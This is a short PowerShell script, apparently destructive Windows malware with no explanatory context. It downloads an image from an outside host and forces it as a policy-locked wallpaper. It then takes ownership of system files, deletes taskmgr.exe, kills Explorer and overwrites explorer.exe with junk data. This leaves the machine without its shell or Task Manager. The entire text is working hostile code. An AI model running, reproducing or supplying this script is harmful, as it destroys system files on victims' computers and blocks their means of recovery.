$down="$env:userprofile\Local Settings\Application Data\Microsoft\Wallpaper1.bmp"
(New-Object System.Net.WebClient).DownloadFile('http://7xrn7f.com1.z0.glb.clouddn.com/16-6-2/70005991.jpg',$down);
start-sleep 5
cmd /c "reg add `"HKEY_CURRENT_USER\Control Panel\Desktop`" /v `"WallpaperStyle`" /t reg_sz /d 2 /f"
cmd /c "reg add `"HKEY_CURRENT_USER\Control Panel\Desktop`" /v Wallpaper /d `"%userProfile%\Local Settings\Application Data\Microsoft\Wallpaper1.bmp`" /f"
cmd /c "reg add `"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System`" /v Wallpaper /d `"%userProfile%\Local Settings\Application Data\Microsoft\Wallpaper1.bmp`" /f"
cmd /c "reg add `"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System`" /v WallpaperStyle /d "2" /f"
cmd /c "RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters"
cmd /c "gpupdate /force"
cmd /c "takeown /f c:\windows\explorer.exe"
cmd /c "echo y `|cacls c:\windows\explorer.exe /g administrator:f"
cmd /c "icacls c:\windows\explorer.exe /grant administrator:f"
cmd /c "takeown /f C:\Windows\System32\taskmgr.exe"
cmd /c "echo y `|cacls C:\Windows\System32\taskmgr.exe /g administrator:f"
cmd /c "icacls c:\windows\System32\taskmgr.exe /grant administrator:f"
cmd /c "del /f /q C:\Windows\System32\taskmgr.exe"
cmd /c "taskkill /f /im explorer.exe&echo 123>c:\windows\explorer.exe"